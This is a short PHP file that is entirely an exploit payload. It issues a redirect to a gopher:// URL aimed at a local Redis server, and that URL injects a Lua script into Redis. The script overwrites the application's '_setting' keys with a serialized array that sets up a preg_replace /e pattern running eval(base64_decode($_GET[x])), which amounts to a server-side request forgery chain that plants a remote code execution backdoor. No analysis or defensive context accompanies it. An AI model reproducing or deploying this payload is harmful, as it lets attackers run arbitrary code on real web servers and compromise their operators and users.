
<?php header('Location: gopher://127.0.0.1:6379/_%0D%0Aeval "local t=redis.call(\'keys\',\'*_setting\');for i,v in ipairs(t) do redis.call(\'set\',v,\'a:2:{s:6:\"output\";a:1:{s:4:\"preg\";a:2:{s:6:\"search\";a:1:{s:7:\"plugins\";s:5:\"/.*/e\";}s:7:\"replace\";a:1:{s:7:\"plugins\";s:30:\"eval(base64_decode($_GET[x]));\";}}}s:13:\"rewritestatus\";i:1;}\') end;return 1;" 0');
?>
